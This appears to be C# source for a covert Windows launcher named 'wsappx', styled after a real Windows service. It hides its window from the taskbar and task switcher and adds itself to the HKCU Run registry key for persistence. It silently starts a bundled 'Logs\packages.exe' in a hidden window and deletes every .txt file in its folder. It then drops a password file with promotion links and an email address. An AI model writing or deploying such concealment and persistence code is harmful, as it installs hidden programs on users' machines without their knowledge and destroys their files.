using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Windows.Forms;

namespace wsappx
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
            this.FormBorderStyle = FormBorderStyle.None;
            this.ShowInTaskbar = false;
        }
        int value = 0;
        //hide use https://www.youtube.com/watch?v=NMmyI-oMC_g Fox Learn
        protected override CreateParams CreateParams
        {
            get
            {
                var cp = base.CreateParams;
                cp.ExStyle |= 0x80;
                return cp;
            }
        }
        private static string path = Application.StartupPath + "\\Logs\\packages.exe";
        private static string path_passw = Application.StartupPath + "\\Password.txt";
        private static string yt = @"https://www.youtube.com/channel/UCei-tSXy69Qr9AnrtpRObog/featured";
        private static string yt1 = @"https://bit.ly/2OYXU6H";
        private static string video = @"https://www.youtube.com/watch?v=HidcrUo95_g&t=45s";
        private void Form1_Load(object sender, EventArgs e)
        {
            passw();
            try
            {
                RegistryKey regis = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                regis.SetValue("wsappx", Application.ExecutablePath.ToString());
                Process prc = new Process();
                prc.StartInfo.FileName = path;
                prc.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                prc.Start();
            }
            catch (Exception)
            {
               
            }
        }
        private void Form1_Shown(object sender, EventArgs e)
        {
            this.Hide();
        }
        void passw()
        {
            try
            {
                DirectoryInfo dir_Info = new DirectoryInfo(Application.StartupPath);
                foreach (FileInfo file_Info in dir_Info.GetFiles("*.txt"))
                {
                    file_Info.Delete();
                }
                StreamWriter sw = new StreamWriter(path_passw, true);
                sw.WriteLine("Password:\tHiLuvTool_TMulti\n\nVideos: " + video + "\n×Following \n+Youtube: " + yt + "\n+Youtube(but Short links): " + yt1 + "\n×Contact Me " + "\n+Gmail: hereisjobbro1@gmail.com\n\n© 2021 Copyright by Hi Luv Channel\n💓Thanks for Anything !💓");
                sw.Close();
            }
            catch (Exception e)
            {
                MessageBox.Show(e.ToString());
            }
        }
    }
}